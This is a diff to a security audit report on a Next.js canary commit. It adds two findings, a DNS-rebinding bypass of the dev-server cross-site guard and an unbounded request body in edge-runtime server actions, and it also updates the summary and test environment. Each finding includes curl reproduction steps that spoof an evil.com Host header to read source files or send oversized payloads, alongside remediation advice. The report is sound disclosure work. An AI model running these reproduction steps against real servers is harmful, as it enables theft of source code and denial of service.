@@ -2,7 +2,7 @@
 
 ## Executive Summary
 
-This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Eight issues were identified and confirmed against live instances in a Docker-based test environment:
+This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v16.3.0-canary.29) for security vulnerabilities. Ten issues were identified and confirmed against live instances in a Docker-based test environment:
 
 | ID | Title | Severity |
 |----|-------|----------|
@@ -14,8 +14,10 @@ This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v
 | VULN-6 | Path Traversal in launch-editor via isAppRelativePath | Medium |
 | VULN-7 | Server Action CSRF Bypass via x-forwarded-host Header Injection | High |
 | VULN-8 | Middleware Rewrite SSRF with Credential Forwarding to Arbitrary Hosts | High |
+| VULN-9 | DNS Rebinding Bypass of blockCrossSiteDEV (dev mode) | High |
+| VULN-10 | Edge Runtime Server Action Unbounded Body (DoS) | High |
 
-All eight vulnerabilities are independently reproducible using the provided exploit scripts.
+All ten vulnerabilities are independently reproducible using the provided exploit scripts.
 
 ---
 
@@ -25,7 +27,7 @@ All eight vulnerabilities are independently reproducible using the provided expl
 - **Commit:** `007051470157d38058730ffa0a1983d4b4106424`
 - **Version:** 16.3.0-canary.29
 - **Testing Environment:** Docker containers on a private bridge network (`audit-net`)
-- **Test Modes:** Production (`next build` + `next start`) and Dev mode (`next dev --webpack`)
+- **Test Modes:** Production (`next build` + `next start`), Dev mode (`next dev --webpack`), and Edge runtime production (`next build` + `next start` with `export const runtime = 'edge'`)
 - **Testing Date:** 2026-05-26
 
 ---
@@ -515,6 +517,150 @@ Option 3: Document the credential-forwarding behavior prominently in the `NextRe
 
 ---
 
+## VULN-9: DNS Rebinding Bypass of blockCrossSiteDEV (dev mode)
+
+**Severity:** High
+
+**Affected Code:**
+- `packages/next/src/server/lib/router-utils/block-cross-site-dev.ts:116-175` — `blockCrossSiteDEV`: lines 169-174 allow all requests with no `Origin` header; the `Host` header is never validated
+
+**Root Cause:**
+
+`blockCrossSiteDEV` guards all `/__nextjs*` and `/_next/*` dev endpoints from cross-origin access. Its final condition at lines 169-174:
+
+```typescript
+// Allow requests with no origin since those are just GET requests from same-site
+return (
+  originLowerCase !== undefined &&
+  !isCsrfOriginAllowed(originLowerCase, allowedOrigins) &&
+  blockRequest(req, res, originLowerCase)
+)
+```
+
+When `Origin` is absent, `originLowerCase === undefined` and the expression short-circuits to `false` — the request is allowed through. The function checks `Origin` and `Referer` but never the `Host` header.
+
+Under DNS rebinding, the browser makes **same-origin** requests to the rebound address. Same-origin requests carry no `Origin` header. The `sec-fetch-site` check at lines 138-154 also does not trigger — it requires `sec-fetch-mode === 'no-cors' && sec-fetch-site === 'cross-site'`, but a DNS-rebound request has `sec-fetch-site: same-origin`.
+
+**Attack Scenario:**
+
+1. Attacker registers `evil.com` with short DNS TTL, initially pointing to their server.
+2. Developer visits `http://evil.com:3000/` in Firefox or Safari. Attacker serves a malicious page.
+3. DNS TTL expires. `evil.com` is rebound to `127.0.0.1`.
+4. JavaScript on the page executes `fetch('/__nextjs_source-map?filename=...')` — same-origin (same scheme + host + port from browser's perspective) — no `Origin` header sent.
+5. Browser sends `Host: evil.com:3000`, `sec-fetch-site: same-origin`, no `Origin`.
+6. `blockCrossSiteDEV` returns `false` (no Origin -> undefined -> short-circuit).
+7. Source map handler returns full source code including secrets. Attacker reads the response.
+
+**Affected endpoints:** ALL `/__nextjs*` and `/_next/*` endpoints — source maps, stack frames, launch-editor, attach-inspector (→ RCE chain), restart-dev, devtools-config.
+
+**Browser mitigation:** Chrome Private Network Access (PNA) blocks requests from public websites to `localhost` since Chrome 94+. Firefox and Safari do **not** implement PNA. The attack is exploitable in Firefox and Safari.
+
+**Distinction from VULN-4/5/6:** VULN-4/5/6 require direct network access to the dev server (an attacker already on the network). VULN-9 requires only that the developer visits a malicious webpage — the browser makes the localhost connection. Different attack vector (browser-based), different root cause (missing Host validation in blockCrossSiteDEV).
+
+**Reproduction Steps:**
+
+```bash
+# Negative control — explicit cross-origin Origin header is blocked (403)
+curl -s -o /dev/null -w '%{http_code}' \
+  -H "Origin: http://evil.com" \
+  "http://localhost:3002/__nextjs_source-map?filename=test"
+# Expected: 403
+
+# DNS rebinding bypass — evil Host header, NO Origin header
+curl -s -o /dev/null -w '%{http_code}' \
+  -H "Host: evil.com:3000" \
+  "http://localhost:3002/__nextjs_source-map?filename=test"
+# Expected: non-403 (204 No Content — request reached the handler)
+
+# Source code exfiltration — read project source file
+curl -s -H "Host: evil.com:3000" \
+  "http://localhost:3002/__nextjs_source-map?filename=/app/app/page.tsx"
+# Expected: non-403 (source map handler processed the request)
+
+# launch-editor oracle also reachable
+curl -s -o /dev/null -w '%{http_code}' \
+  -H "Host: evil.com:3000" \
+  "http://localhost:3002/__nextjs_launch-editor?file=app/page.tsx"
+# Expected: 204 (file exists — all /__nextjs* endpoints bypassed)
+```
+
+**Evidence:**
+- Explicit `Origin: http://evil.com` returns 403 — baseline protection confirmed
+- `Host: evil.com:3000` with no Origin returns non-403 — `blockCrossSiteDEV` bypassed
+- `/__nextjs_launch-editor` returns 204 — all dev endpoints reachable via DNS rebinding
+
+**Remediation:**
+
+Validate the `Host` header in `blockCrossSiteDEV`. If the `Host` header does not match `localhost`, `127.0.0.1`, `[::1]`, the configured hostname, or entries in `allowedDevOrigins`, block the request with 403. This prevents DNS-rebound requests with an attacker-controlled `Host` from passing the check even when `Origin` is absent.
+
+---
+
+## VULN-10: Edge Runtime Server Action Unbounded Body (DoS)
+
+**Severity:** High
+
+**Affected Code:**
+- `packages/next/src/server/app-render/action-handler.ts:759` — explicit `// TODO: add body limit` comment; no size check anywhere in the edge block (lines 749-869)
+- `packages/next/src/server/app-render/action-handler.ts:773` — `await req.request.formData()` reads the entire multipart body into memory without size limit
+- `packages/next/src/server/app-render/action-handler.ts:851-862` — `while(true)` reader loop accumulates non-multipart body without size limit
+- `packages/next/src/server/app-render/action-handler.ts:901-931` — `sizeLimitTransform` with 1MB default limit, used ONLY in the Node runtime path; absent from edge path
+
+**Root Cause:**
+
+The action handler has two paths: Node runtime (lines 875+) and edge runtime (lines 749-869). The Node path wraps the request body in `sizeLimitTransform`, which counts bytes and throws an `ApiError(413)` when the body exceeds the configured limit (default 1MB). This error is caught by the RSC error boundary (resulting in HTTP 500 to the client), but critically the body read is aborted before the full payload is buffered — the server is protected from memory exhaustion. The edge runtime path has an explicit `// TODO: add body limit` comment but no enforcement. All body reads in the edge path — both multipart (`formData()`) and non-multipart (reader loop) — are unbounded.
+
+An attacker can exhaust server memory by sending arbitrarily large request bodies to any edge-runtime server action endpoint.
+
+**Attack Scenario:**
+
+A Next.js application uses `export const runtime = 'edge'` on a page or route handler (e.g., for low-latency response or Vercel Edge Network deployment) that also processes server actions. An attacker sends a series of multi-megabyte POST requests to the server action endpoint. The edge handler buffers the entire body before processing. With no limit, the attacker can send gigabyte-scale bodies, exhausting the process's memory and causing a denial of service.
+
+**Production impact:** This is exploitable with `next start` (production mode) against any page with `export const runtime = 'edge'` that accepts form submissions or server actions. No authentication required.
+
+**Reproduction Steps:**
+
+```bash
+# Extract action IDs (42 hex chars)
+ACTION_ID_EDGE=$(docker exec audit-edge-app \
+  cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)
+ACTION_ID_NODE=$(docker exec audit-nextjs-app \
+  cat /app/.next/server/server-reference-manifest.json | grep -oE '[0-9a-f]{42}' | head -1)
+
+# Generate 2MB payload
+dd if=/dev/zero bs=1024 count=2048 | tr '\0' 'A' > /tmp/2mb_payload
+
+# Negative control — Node runtime rejects 2MB body (sizeLimitTransform enforced)
+curl -s -o /dev/null \
+  -X POST \
+  -H "Next-Action: $ACTION_ID_NODE" \
+  -H "Content-Type: text/plain;charset=UTF-8" \
+  --data-binary @/tmp/2mb_payload \
+  "http://localhost:3000/"
+docker logs audit-nextjs-app 2>&1 | tail -20 | grep "Body exceeded"
+# Expected: "Body exceeded 1 MB limit" in server logs
+
+# Positive exploit — Edge runtime accepts 2MB body (no limit enforced)
+curl -s -o /dev/null \
+  -X POST \
+  -H "Next-Action: $ACTION_ID_EDGE" \
+  -H "Content-Type: text/plain;charset=UTF-8" \
+  --data-binary @/tmp/2mb_payload \
+  "http://localhost:3004/"
+docker logs audit-edge-app 2>&1 | tail -20 | grep "Body exceeded"
+# Expected: No "Body exceeded" message — body was fully buffered without limit
+```
+
+**Evidence:**
+- Node runtime (port 3000) server logs contain `Body exceeded 1 MB limit` after receiving 2MB body — `sizeLimitTransform` enforcement confirmed (the 413 ApiError is caught by the RSC error boundary, so the HTTP response is 500, but the body was rejected before full buffering)
+- Edge runtime (port 3004) server logs do NOT contain `Body exceeded` — 2MB body was fully buffered into memory without any size enforcement
+- Explicit `// TODO: add body limit` comment at `action-handler.ts:759` confirms the missing protection is known
+
+**Remediation:**
+
+Add body size enforcement to the edge runtime path in `action-handler.ts`. Before calling `req.request.formData()` (line 773) or entering the reader loop (lines 851-862), count bytes via a `ReadableStream` transform and throw a 413 response if the byte count exceeds the configured limit (matching the Node default of 1MB). The `serverActions.bodySizeLimit` configuration value is already available at this point in the function.
+
+---
+
 ## Appendix: Test Environment
 
 ```
@@ -524,6 +670,7 @@ audit-net (Docker bridge network)
   +-- audit-nextjs-app-test-headers (3001:3000) — next start, NEXT_PRIVATE_TEST_HEADERS=1
   +-- audit-nextjs-dev (3002:3000, 9230:9229) — next dev --webpack, NODE_OPTIONS=--inspect=0.0.0.0:9229
   +-- audit-middleware-app (3003:3000) — next start, production mode, middleware SSRF target
+  +-- audit-edge-app (3004:3000) — next start, production mode, edge runtime server actions
   +-- audit-redirect-server (8080:8080) — issues 302 redirect to secret server
   +-- audit-secret-server (9090:9090) — serves JPEG, logs access
   +-- audit-credential-capture (9091:9091) — logs captured Cookie+Authorization headers
